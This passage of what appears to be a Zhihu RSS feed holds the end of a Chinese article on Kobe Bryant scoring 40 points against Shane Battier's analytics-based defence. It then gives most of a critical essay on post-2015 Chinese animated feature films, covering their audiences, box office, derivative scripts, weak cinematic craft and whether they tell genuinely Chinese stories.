src=\"https://pic2.zhimg.com/v2-b166790e225149d2d648662f07d05471_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic2.zhimg.com/v2-b166790e225149d2d648662f07d05471_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic2.zhimg.com/v2-b166790e225149d2d648662f07d05471_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>之后是科比右侧运球，右手突底线，轻靠巴蒂尔后借力抛射，恰好没让海耶斯干扰到。</p>\n<p>慈世平之后闹事，被罚下。</p>\n<p>科比左腰横切，接传球后又是空中扭身中投。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>然后就是全场最精妙的一球。<br></p>\n<p>科比右翼面对巴蒂尔，转身假动作被识破。至此是巴蒂尔的完美防守。</p>\n<p>于是科比别扭地抛板，立刻连一个别扭的跨步起跳，自投自抢，在姚明头顶点中。姚明和加索尔卡位呢，跟过来时，慢了一步。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-7b6d27f8f089c172d66128d1daee75e9_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic2.zhimg.com/v2-7b6d27f8f089c172d66128d1daee75e9_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic2.zhimg.com/v2-7b6d27f8f089c172d66128d1daee75e9_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>巴蒂尔防科比这个战略，是萨姆·辛基拿了一堆数据分析跟他一起研究出来的。</p>\n<p>赛后，辛基看着科比27投16中40分的数据，说了句话：</p>\n<p>“<b>科比得了40分，这么说有点难为情……但巴蒂尔今晚的防守真的很好</b>。”</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>的确。<br></p>\n<p>巴蒂尔全场跟科比斗智斗勇。没哪次防守是撒汤漏水的。没哪次防守没跟到位。没哪次防守脑抽失误。</p>\n<p>大家说防守好一般都爱说，让对手work for his points，巴蒂尔的确给科比制造足够多麻烦了。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这才是诡异的地方：</p>\n<p>巴蒂尔没犯错。</p>\n<p>但科比还是27投16中得了40分。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>2008年西部决赛，波波维奇和马刺投篮教练英格兰杰一起表达过类似的意思：</p>\n<p>“科比不算联盟最好的远投手——但是联盟最好的跳投手之一。”</p>\n<p>这话有点别扭，毕竟对许多人而言，远投准才是投篮好。</p>\n<p>但看科比无数次越过巴蒂尔的投篮就知道了。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>他的扭身右脚滞空投，自己曾在2014年描述过，他看《Discovery》，发现猎豹高速奔跑时，也会靠尾巴维持平衡。所以：</p>\n<p>“我能用右脚当尾巴，对吧？”<br></p>\n<p>他的这种能力，让他无需调整到投篮步伐，也能强行起手。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>更有趣的一点：</p>\n<p>大多数优秀投手，都需要稳定的姿势才能找到投篮感觉。多少优秀射手十几年如一日雕琢同一个投篮姿势。</p>\n<p>而科比对巴蒂尔这一场的策略很明白：他知道巴蒂尔逼他用高难度投篮，他知道巴蒂尔试图遮眼控手破坏他的节奏。</p>\n<p>实际上全场科比<b>几乎没连续用同一种姿势投</b>，不是所谓“趁手热连着来几发”。他也知道对付巴蒂尔这种聪明人，得连续变招。</p>\n<p>他变了许多招，用不同的投篮方式，用许多奇怪的微调，让巴蒂尔完美无缺的跟防，总是差那么一小步。<br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4ccee8be8b7d66d277bf68d5fb24d5b4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"620\" data-rawheight=\"853\" class=\"origin_image zh-lightbox-thumb\" width=\"620\" data-original=\"https://pic1.zhimg.com/v2-4ccee8be8b7d66d277bf68d5fb24d5b4_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>1992年总决赛滑翔机被乔丹打爆后心悦诚服，“我以为迈克尔有两千招，我错了，他有三千招。”<br></p>\n<p>科比这一场，也差不多。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>开场用无球走位和真假挡拆迅速拉开比分打停。下半场用连续高难度持球单挑得分。无球走、右突投、右手突、左突投、追身投、右突投、试探步反向突破突中路、连续变向右突投……等被夹到绝境里，一个抛板自己投。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>每次巴蒂尔跟上了，科比总还有一点小小的变招在等他：投篮出手高一点、投篮起手快一点、加一个小跳步、直接急停起手，诸如此类。</p>\n<p>把高难度失衡投篮当家常便饭。皮尔斯所谓“连环杀手”。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>所以麦克米兰对巴图姆说的：对位科比？“祝你好运。”</p>\n<p>许多时候，你做得完美无缺，让科比的每个投篮都不容易了——但科比还是投得中。</p>\n<p>实际上，他的优点（历史级的高难度投篮能力）和他的毛病（热血上头时的投篮选择），都在这里面：</p>\n<p><b>对别人而言不得不为之的高难度变招投篮，对他而言，就是平平淡淡的日常。</b><br><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhang-jia-wei?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">张佳玮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/402762072?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中国动画现在的发展如何？","date":"2021-08-24 11:30:09","description":"\n<blockquote>如今的国产动画电影在创作风格上普遍呈现“日美中”三国的混搭，刻薄地说，就是“用中国题材，以美国形式，讲日式二次元故事”。</blockquote>\n<p>《大圣归来》在2015年暑期档斩获的9.54亿元票房和因该片而流行开的“自来水”概念，被认为是“国漫崛起”的重要标志（“国漫”这个词将动画与漫画混为一谈，但作为一个已经在大众媒体流传开来的经典误用，本文仅在此使用一次，特此注明）。相比于“昙花一现”的“国产科幻崛起”，仅针对成年观众的国产三维动画长片这一细分门类来说，这六年来创作者与市场给予了一定的持续性正向反馈。如今的大陆电影市场上，国产动画电影是一条热门赛道，不仅是每个档期必备的重要种子选手，催生了如《哪吒：魔童降世》50.35亿元的票房奇迹，甚至已经在特殊档期能够承载“救市”的期待（如今年7月上映的《白蛇2：青蛇劫起》），制片方借助IP实现“电影宇宙”的构建也不再是空谈。</p>\n<p>可以说，国产动画电影这一类型片种在大陆市场上的持续性输出和商业成功是具有开创性的，无论是从横向还是纵向观察，在任何一个电影市场上都是少见的——完全可以说，国产动画电影的发展，正是近年来“讲述中国故事”这一文化路线的实操成果。</p>\n<p>然而，这条赛道越发热门，竞争就越发激烈，每年试图分一杯羹的“炮灰”数不胜数。即使是在市场上得到良好反馈的作品，也不一定满足了创作者和观众热情饱满的期待；对国产动画电影的火爆现状终究会归于沉寂的担忧声音，在每一部“出圈”的动画电影上映时都会响起。实际上，当初业界惊呼“产业崛起”时的高涨情绪，经过六年之后，逐渐被某种流于日常的平庸感所攫取：这一行业和类型到了现在，已经没什么“惊奇”可言。</p>\n<p>虽然作品还在持续不断地推出，票房也都基本达到预期，然而国产动画电影在翻过高山之后，似乎进入到一个波澜不惊的平庸期：目所能及的尝试与突破都已走到尽头，依然信心高涨的创作者们身后，观众和市场仿佛在暗中酝酿一场改换门庭的暗影危机。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d35d24cdab0b0b33fa4ca65c030af6d4_720w.jpg?rss\" data-caption=\"《哪吒之魔童降世》票房破50亿海报。图片：《哪吒之魔童降世》电影官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1422\" data-watermark=\"original\" data-original-src=\"v2-d35d24cdab0b0b33fa4ca65c030af6d4\" data-watermark-src=\"v2-c4c3ae32d0e22e7b4eb10f906e853fea\" data-private-watermark-src=\"v2-88a0884a1d7091f5b1b9664252f0e0b5\"></p>\n<p><b>国产动画电影的受众到底是谁？</b></p>\n<p>这个问题荒谬吗？从票房成绩上来看，也许并不。我们可以列出一张2015年后比较重要的国产动画电影（非针对儿童市场）票房成绩表：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-35faa1cb8d149dd646bdc32f795e951b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"519\" data-rawheight=\"296\" data-watermark=\"original\" data-original-src=\"v2-35faa1cb8d149dd646bdc32f795e951b\" data-watermark-src=\"v2-bba80e118805c27411e15dbcbdff8250\" data-private-watermark-src=\"v2-61f131f4d014c57f30ef9178f3b32de0\"></p>\n<p>一旦我们将针对儿童市场的《熊出没》系列等片排除出考察范围，国产动画电影的票房成绩显示出一个清晰的基本盘：人民币3-6亿。也就是说，如果无法创造全民性的、超越动画电影本身受众范围的“出圈效应”，类似《白蛇》系列这样口碑表现良好的优质IP的最终票房射程大致也就在6亿左右：虽然这个数字在票房整天“放卫星”的大陆市场毫不起眼，但在动画电影类型中已是极佳的成绩，足以支撑追光动画规划自己的“动画宇宙”；毕竟还有更多作品根本无法企及这一数字，比如创造了足够的话题，却因题材限制致使受众无法扩展的《大护法》，又比如在2021年企图借助动画电影风口一飞冲天最终沦为市场失败者的《西游记之再世妖王》（1.13亿）和《济公之降龙降世》（4064万）。</p>\n<p>拨开《哪吒之魔童降世》的“全民神话”，尽管拥有超高的关注度，国产动画电影整体上绝非当今市场特别青睐的类型。真正成功的作品凤毛麟角，想要达到3-6亿的基本盘都得费尽心思，类似《哪吒》和《姜子牙》这样的奇迹基本不可复制（实际上，从《姜子牙》的营销投入和观众的期待值来看，16.02亿的成绩绝非成功）。</p>\n<p>由此可以解释，为何几乎每部在大陆上映的国产动画电影都不可避免地进行“卖惨”式营销，为何每部作品都是制作方砸锅卖铁苦心孤诣，搞得仿佛一旦失败中国动画就将暗无天日似的，哪怕几年下来观众对这样的营销基本脱敏：虽然这些话术都是俗烂的营销手段，但某种意义上也是现实——制片方肯定掌握更加详细的用户大数据信息，他们的结论就是这个市场不太大。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b5567cb7103e81d1b0cb8b7f7e3e380a_720w.jpg?rss\" data-caption=\"原定于2020年大年初一上映的《姜子牙》与《哪吒之魔童降世》的联动海报。图片：《姜子牙》电影官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1161\" data-watermark=\"original\" data-original-src=\"v2-b5567cb7103e81d1b0cb8b7f7e3e380a\" data-watermark-src=\"v2-42e4c131dafba1942f7acee50c96fe93\" data-private-watermark-src=\"v2-5e0de6db510f53068829ed2532acd0ba\"></p>\n<p>其实，也可以从近年重要的国产动画电影的选材和创作风格中，勾勒出受众画像。首先，从来没有人把“喜羊羊”和“熊出没”系列当作国产动画崛起的标志，可见其受众群体并不考虑儿童与他们的家长，而是与日本类似，以热爱动漫的青少年和二次元青年人为主；其次则是与美国动画市场类似，主攻在院线上映的动画长片，从角色设置到剧本结构均以迪士尼为师，受众目标是经常光临影院的青年观影群体；其三，选材和文学基础上具有浓郁的网络文学特质，遵循电子游戏的冒险逻辑，品味和审美较为迎合青年男性（哪怕是以女性做主角）——类似“我命由我不由天”“有朝一日权在手”“天道还是人道”的“中二”式男性幻想往往是国产动画电影文本创作的思想底色。</p>\n<p>有趣的地方是：我们是在勾勒一种类型片的受众吗？不，我们似乎是在精准地筛选出一群特殊而小众的群体。这群人首先有足够的年龄，其次对日式二次元文化有兴趣，又不排斥美国的动画长片文化，又是院线电影的忠实爱好者，既能接受美式三维动画的低龄画风，还热衷于修仙武侠题材的网络文学与中二的成长叙事——这样的用户画像几乎是“缝合怪”，它不是寻找观众的最大公约数，反而是在筛选核心观众，本质上是与尽可能包括所有群体的“合家欢”商业逻辑相违背的。</p>\n<p>理论上，国产动画电影的风格包罗万象，百花齐放，多元性强，似乎是一个尽量包含了动画爱好者所有能够想到的领域的聚合体，但实际上，它却是一个内在元素时常自相矛盾，对观众来说时而新奇莫名，时而一锅乱炖的“弗兰肯斯坦”。单论创新程度，值得鼓励也颇令人疑惑的事实是：国产动画电影的确走出了一条全新的路径，创造出了一套中国大陆独有的动画电影语汇，的确拍摄出了世界罕见，绝对“中国特色”的动画电影。这甚至与观众不完全相关，与制片方的商业规划也不完全符合，甚至追溯到本源，可能和中国最早的那一批动画导演的个人经历与审美有关。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3efbdefd55f4f61901ceb397b0a5171a_720w.jpg?rss\" data-caption=\"风格颇受宫崎骏影响的《大鱼海棠》剧照。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"417\" data-watermark=\"original\" data-original-src=\"v2-3efbdefd55f4f61901ceb397b0a5171a\" data-watermark-src=\"v2-81cd6465e231ca1f4d5f9fe6a6293f41\" data-private-watermark-src=\"v2-aba83795575febc9e3dab4a336ab602f\"></p>\n<p>总的来说，如今的国产动画电影在创作风格上普遍呈现“日美中”三国的混搭，刻薄地说，就是“用中国题材，以美国形式，讲日式二次元故事”。</p>\n<p>其一，国产动画电影的创作者不可避免地有爱好日式二次元的背景，这一背景对创作最大的影响是：否认动画是一种只面向儿童的艺术形式，认为动画可以用来讲述任何年龄段都能欣赏的故事。与此同时，却又因为创作者自身年龄的取向，较为专注于写作青少年的个人成长故事。</p>\n<p>其次，作为在院线上映的电影，从形式上就受到美国动画长片创作风格的影响。首先是剧本写作上的结构式模仿，主打追寻个人价值、认识自我的美式主题诉求与日式成长故事的融合；从人物设置上拷贝美国动画的既有经验，比如必然为主角建设一个跟班小分队，肯定存在一到两个模仿梦工厂动画片的搞笑角色，基本会为主角安排“萌宠”；剧本结构完全按照好莱坞商业电影的三段式逻辑来写作，处处追求“大片”范，最后一幕主角的“重新崛起”已成为固定套路和规范习题；</p>\n<p>值得一提的是，除了少数画风独特的作品，国产动画电影基本采取美国动画电影低龄非真人比例的三维画风，这一选择是否与技术能力和成本控制有关尚有争议（毕竟如今国产单机游戏开发都已普遍使用虚幻4引擎），但却从根本上导致国产动画电影时常以低幼的合家欢画风，表现成熟深刻（抑或是故作深沉的中二伪深度）的故事，无时不在的本质违和感近乎荒谬。</p>\n<p>其三，在多重因素的鼓励下，国产动画电影大都把自身的创作与“国潮”“传播中华传统文化”“讲述中国故事”绑定，自我规定为中国经典神话IP的再创作。《西游记》《封神榜》和《白蛇传》三大源流基本上垄断了目前大多数国产动画电影的选题，导致六年来总数虽不到二十部，但很多人物和故事却已经被反复地、多角度地讲述，观众已经进入疲劳期；而从目前的状况看来，解决疲劳的方式却并不是扩展和拓展题材（哪怕只是寻找其他的中国神话和传统故事），相反是以各种视觉风格和文本解读角度不断重述既有的故事，这一发展方向显然是商业投资人的短视所致。</p>\n<p>回到一开始的问题，这个市场为什么不太大呢？其实，倒不如反问一句：爱好这么独特的“缝合怪”和“创新产物”的受众群体，真的会很大吗？</p>\n<p><img src=\"https://pic2.zhimg.com/v2-48d264004f490b3d6fa23abf8d0eed5f_720w.jpg?rss\" data-caption=\"《姜子牙》中的萌宠“四不像”。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"335\" data-watermark=\"original\" data-original-src=\"v2-48d264004f490b3d6fa23abf8d0eed5f\" data-watermark-src=\"v2-75427e17c2b55f7cbe55b40da321670c\" data-private-watermark-src=\"v2-b32b850a46a69bf06b2ec2408fd6c5fc\"></p>\n<p><b>“剧本医生都不想再见到的程度”</b></p>\n<p>无论是业界还是观众，真正意义上认可国产动画产业的成功，都得从《大圣归来》和《哪吒之魔童降世》算起：国内的舆论环境显然认为在院线上映的电影长片才是“登堂入室”的标准，来自日本的以漫画和电视剧集为主，以“剧场版”“大电影”为辅助的模式并不被国人认可。既然把主战场放在院线，观众必然要以商业电影的标准来看待国产动画电影——那么，六年来我们遇到过几部剧本“合格”，可以被称为“剧本写作”的国产动画电影呢？有一说一，这个数字恐怕不多；虽然整个业界都知道“内容为王”，也绝对不是不重视编剧和剧本质量，每次都和观众保证编剧绝对用心了，然而大多数国产动画电影最后的剧本，恐怕都还是好莱坞的“剧本医生”都不想再见到的程度。</p>\n<p>首要问题是俗套。鉴于我们的题材集中于《西游记》《封神榜》和《白蛇传》这三个IP里，“创意”这个词的定义对国产动画编剧来说显然改变了，从创造变成了阐释，变成对古代故事进行现代解读。可是，为什么几乎每一个剧本的主旨都是寻找自我与自我实现呢？这未免太过于“现代性”了一些，我们的每个主角几乎一开始都不愿意做自己，都遇到了青春期的成长问题，暴躁、易怒、对世界有不一样的理解，满腔反抗精神，拷问自我的价值，从挫折中屡败屡战，寻找人生的解脱道路，并一定在故事的最后“找回了自己”，成为了“标题的那个人”——算了啰嗦了，其实我们的每个主角都是孙悟空，要么是周星驰的，要么是今何在的。</p>\n<p>当然，每部商业电影都存在主角自我实现这一母题，这固然不错，但相较于漫威宇宙采取的“类型片巡礼”路线——以谍战片、战争片、宫廷史诗片、无厘头喜剧片等各种类型来包裹超级英雄内核，国产动画电影这六年来的实践，大多数只选择了动作冒险片，甚至刻薄地说，是武侠偶像剧这唯一的类型路径。主题陈旧，孙悟空整天拷问自我，不知道自己是谁；剧本类型单一，不按“勇者斗恶龙”的冒险模式走就无法展开剧情；大多数时候，观众希望看到令人眼前一亮的故事基本是一种奢求。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e8bec215de14356993f29b53144dd91e_720w.jpg?rss\" data-caption=\"《美国队长2》从剧作上是一部谍战片。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"533\" data-watermark=\"original\" data-original-src=\"v2-e8bec215de14356993f29b53144dd91e\" data-watermark-src=\"v2-f5fa64bf0a03d0d8f8df35210ef79028\" data-private-watermark-src=\"v2-4bd9205911324313a463cd9eb2ab8fd9\"></p>\n<p>然而，哪怕是为了商业诉求上的安全采取既定的动作冒险片模式，兢兢业业完成的话至少不过不失，足以保证电影其他亮点的展现；但部分国产动画电影的剧本写作堪称敷衍，基本只是为了满足套路需求，为事先预设的大场面戏码提供甚至都说不太过去的理由。21世纪以来网络文学的“升级打怪”套路，或者说电子游戏所带来的清关思维取代了基本的情节写作，借自迪士尼的“萌宠”和借自梦工厂的主角团队内部搞笑吐槽互动取代了基本的人物塑造。</p>\n<p>2021年春节档的《新神榜：哪吒重生》被调侃为“靠死人推进剧情”，这个来自“民国蒸汽朋克”世界，开机车的“新哪吒”，连内心挣扎和自我实现戏码都欠奉，整部电影除了依靠亲人受伤和死亡一步步开发“小宇宙”提升战力之外，就不存在心理意义上的“成长”，剧情就是不断铺陈“挫折——变强——挫折——变更强——挫折——变超强”的“逆袭爽剧”，与动作冒险电子游戏的通关过程达成高度的形式一致性，导致电影完全沦为只为展现动作场面和技术能力、毋需观众操作的电子游戏视觉秀。</p>\n<p>其三，剧作的文学能力和审美品位始终未见提升。堪称“全民观影”的《哪吒之魔童降世》存在的最大争议，就是影片中大量“屎尿屁”风格的喜剧笑料。毫无疑问这是创作者针对商业需求所刻意设计的（也相对放大了导演饺子一贯的品味偏好），事实上也取得了前所未有的票房回报，但是商业电影中负责吸引大众的喜剧元素难道一定要是如此“下三路”的吗？</p>\n<p>由于国产动画电影的情节和格调基本脱胎于早期网络文学，一定程度上直观暴露了导演和编剧的文化底蕴。类似《姜子牙》中反复提及却流于平面的“人道还是天道”“如何拯救苍生”，《大圣归来》《新神榜：哪吒重生》中被一唱三叹的“弱者逆袭”“强者归位”，这类连网络文学都开始觉得陈腐的“定番”屡次上演，使得国产动画电影始终难以逃脱“中二”的底色，很难立足于经典故事真正讲出现代的新意，缺乏创作者希望拥有的“深刻”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9f6d13e8dd9c78ef97ce4c2fda8353ed_720w.jpg?rss\" data-caption=\"《白蛇2：青蛇劫起》中的女性情感刻画。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-9f6d13e8dd9c78ef97ce4c2fda8353ed\" data-watermark-src=\"v2-b3622c3bfd5a8b2a8cf0f7291f0c775e\" data-private-watermark-src=\"v2-9cd8ba9b100f651dda4c16870511b091\"></p>\n<p>另外，国产动画电影中的女性角色，受到受众需求和创作者个人品味的引导，时常尴尬地使用非真人比例的卡通画风贩卖刻板印象的“软色情”，在女性角色的身材和服装设计上毫不掩饰地展现男性凝视。人物塑造上要么写成工具人，要么以极为可疑的视角来写作女性故事和女性之间的爱恋情感，颇有不真诚地“打女权牌”之嫌——不仅是编剧，国产动画电影创作团队的各个部门都被强烈的男性审美特征所把控，相对缺乏女性创作力量的注入。</p>\n<p>一个就摆在我们面前，但还是令人震惊的现实是：国产动画电影的剧本内容大多数取决于投资人、导演或者技术部门负责人，很少由专业的电影编剧来负责，甚至大多数执笔者也都不是专业编剧。导演往往沉迷对过往成功路径的依赖，不断地重复自己多少年都不熄灭的中二情怀；制片方往往会吹嘘他们是多么关心剧本，但他们往往关心的只是剧本中存在多少之前被市场证明过能够大卖的元素，只在乎剧本能不能顺畅地把技术部门想要画出来的大场面有逻辑（没逻辑也行）地串联起来，只想问编剧创造的角色和台词搞不搞笑，有没有金句爆点，到底像不像迪士尼。</p>\n<p>大部分国产动画电影最终的剧本文本呈现，基本由无数断裂的增删痕迹、被粗暴嵌入的对其他成功作品的模仿、白开水般交作业式的剧情对话，以及编剧最终放弃逻辑的沉默呐喊所构成。无论怎样的主题素材，何种人物和故事背景，最终都拍成了“孙悟空传”，都被串联为一个“搞笑角色在主角小分队中不断插科打诨的超级英雄动作冒险故事”（谁能想到《姜子牙》也能是一个超级英雄个人冒险故事？）：</p>\n<p>打败拦路的敌人，变得更强，找到自己，拯救苍生，观众和导演的中二病都在影片中被狠狠地满足了，而被宣传吸引进电影院的路人观众，没能与国产动画电影的经典青春期少男中二气质对上焦，观影过后满腔怒火地在社交网站上吐槽情节和剧本。这些声音，在一片“有笑有泪”“国产动画崛起”的呼声中往往显得特别孤单可笑，到头来不得不无奈地感叹：</p>\n<p>原来中国动画就是这样的啊？</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a9d92c559bfbd12520cee14e06bb7d79_720w.jpg?rss\" data-caption=\"梦工厂出品《怪物史莱克》的主角团队角色设置成为广泛被模仿的定则。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-a9d92c559bfbd12520cee14e06bb7d79\" data-watermark-src=\"v2-f4fa86481a5e907537153ff92295dab7\" data-private-watermark-src=\"v2-6ca6ad03293678b47af22a9c17862b1f\"></p>\n<p><b>他们到底讲的是“中国故事”吗？</b></p>\n<p>剧本的孱弱与失控只是国产动画电影制作全景中的一个缩影，它暴露的是制片方对“电影”这一艺术形式本体尊严的漠视：选择拍摄电影长片只是为了利润最大化，然而电影制作本身是有门槛的，甚至，剧本创作的门槛可能是其中最低的。当下国产动画电影的制作团队成员里有多少出身于“电影”而不是“动画”的呢？事实是，大多数创作者都是动画制作出身，哪怕厂商从好莱坞挖来的一线人才也基本都来自技术与特效部门，缺乏导演和独立创作经验——对他们来说，“电影”只是在把动画短片拉长而已。</p>\n<p>习惯于真人长片，有一定阅片量的电影观众，经常会在国产动画电影中看到匪夷所思的、教科书反例般的剪辑事故与运镜失误，其镜头语言的匮乏与低劣甚至远不如大多数电视连续剧。六年过去，国产动画电影的“电影质感”进步缓慢，始终处在极低的档次上，“观之不似电影”。电影作为一门视觉艺术，其视觉冲击力绝不仅仅是某些“大场面”，伴随迪士尼风格的甜腻画风，镜头语言的粗劣更是放大了观影的不适感，某种意义上，进一步加深了路人观众“这还是给小孩子看的”的误解。</p>\n<p>我们相信，上述误解是任何一个国产动画电影创作者都希望彻底破除的，但他们可能以为把剧本写得“黑深残”就能解决，而遗忘了以镜头语言为代表的一系列有关摄影、剪辑、音效、音乐等本质属于“电影”范畴的技术问题。作为对比，国产商业电影历经几十年的淬炼，已经逐渐普及了基础的电影制作“行活”，但很明显，与电影人完全不在一个赛道上的动画人，似乎没有真正意识到“电影”意味着什么。</p>\n<p>2015年以来的国产动画产量和票房的崛起，离不开国家文化政策对动漫产业的鼓励与扶持，实际上创作者们也异常自觉地将创作主题集中于传统文化题材，自觉地把自身与“国潮”“讲述中国故事”绑定，始终坚持站在“古风”亚文化的风口。由此可见，说他们沉溺于过往经验、故步自封是不公正的，显然他们足够审时度势，知道要把有限的力气花在哪里——与其下功夫提升观众一时半会看不出来的电影制作水准，不如将精力花在最惹人注意的题材和IP上，视觉和剧本只要以公认世界顶级的迪士尼为尊就不会出错；投资人和创作者固然如此精明，但值得反思的问题是，六年来，国产动画电影虽然基本都是国风题材，可是他们真的“讲述中国故事”了吗？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7e729ab88157a63694f80a0423c3584d_720w.jpg?rss\" data-caption=\"迪士尼经典动画电影《花木兰》剧照。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-7e729ab88157a63694f80a0423c3584d\" data-watermark-src=\"v2-4704b3d05b8124e3eb420dc864d55579\" data-private-watermark-src=\"v2-b7d3cfa4725ca8edee67cf74b6183855\"></p>\n<p>这个问题说得更加直接一点，这些把中国经典神话和名著故事修改成好莱坞式个人成长故事的剧本，讲的是“中国”故事吗？也许，到头来只是一部部由中国人制作的迪士尼《花木兰》而已。这些动画电影在国外有多少影响力呢？甚至于，他们做到在国内范围向国人讲述中国故事的任务了吗？</p>\n<p>以票房50.35亿元的《哪吒之魔童降世》为例，尽管这个例子已经有些老生常谈：一个关于哪吒闹海故事的当代解读，剧本的核心主旨却落在了“家庭价值”之上，很难不令人感到荒谬。如果创作者是想表达传统的家庭价值，中国传统文化宝库中的素材并不缺少，可他们偏偏选择传统文化中反抗父权制的代表哪吒来阐释“父慈子孝”，将原作中哪吒与父权的不共戴天改换成亲情至上，在成长中与父母和解的温情戏码，让本来不服从任何强权的哪吒归顺“天道”，这其中的思维逻辑是如何运转的？</p>\n<p>有观点认为，现代解读要贴合时代精神，当下家庭价值是一种能够传遍世界的普世价值，这一解读是为了让哪吒的故事走向世界，让更多现代观众和外国观众理解——那么敢问，这部在国内席卷50.35亿票房的动画电影，怎么海外票房累计只有600多万美元，仅占到全球总票房的0.5%呢？</p>\n<p>抛开国产电影海外宣发的不易，最终这个拥护家庭价值的、属于世界的哪吒，还是没有走向世界（倒是一路破坏到底的孙悟空更容易被世界理解一些）。说到底，还是不要给他们戴上“文化输出”的高帽，他们当初选择让哪吒拥护家庭价值的根本原因，只不过是他们认为好莱坞的商业剧本模式是好的，而按照这个剧本模式写作的话，必然需要一个温和的价值观基底，那么直接沿用美国动画电影的“家庭观”是最方便的罢了——票房成绩也证明了他们的远见。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fe1e00c3f67df2626f38dc1e00ed7312_720w.jpg?rss\" data-caption=\"家庭价值是《哪吒之魔童降世》的重要主题。图片：《哪吒之魔童降世》预告片截图\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-fe1e00c3f67df2626f38dc1e00ed7312\" data-watermark-src=\"v2-1e1490e71b9fc6b523d95e443a4f6c5f\" data-private-watermark-src=\"v2-054a76fa548602be0ffccbcbe376f799\"></p>\n<p>只不过，这一点都不“国潮”，还是一部迪士尼的《花木兰》，而且是2020年的真人版；当初迪士尼动画版《花木兰》，甚至在跨文化视野上做得还很多元——别人在北美讲跨文化的中国故事，我们在中国讲普世故事。</p>\n<p>相较看来，虽然追光动画的《新神榜：哪吒重生》里的哪吒是个没成长的、反对一切的愣头青，剧本完全没有找到成长主题与原作精神的契合点，哪怕影片破除题材和时代限制玩起了蒸汽朋克、赛博朋克和荒野机车，哪怕影片在美术视觉上无限地“反叛”与现代，这个哪吒本质上都比《哪吒之魔童降世》更中国——此时，去批判这几部动画电影的主角塑造其实还是立足于美式个人英雄主义都显得苛求了，毕竟同样是塑造英雄，中国故事与世界故事的差异在哪里还需要进一步探索，但无论如何，都比直接把哪吒“父慈子孝”更中国一些。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-113c09309f7686c2ef4e5052d954bbb9_720w.jpg?rss\" data-caption=\"《新神榜：哪吒重生》中的“民国蒸汽朋克”街景。图片：《新神榜：哪吒重生》官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"335\" data-watermark=\"original\" data-original-src=\"v2-113c09309f7686c2ef4e5052d954bbb9\" data-watermark-src=\"v2-d22670673f5df44004c6bb50f7053585\" 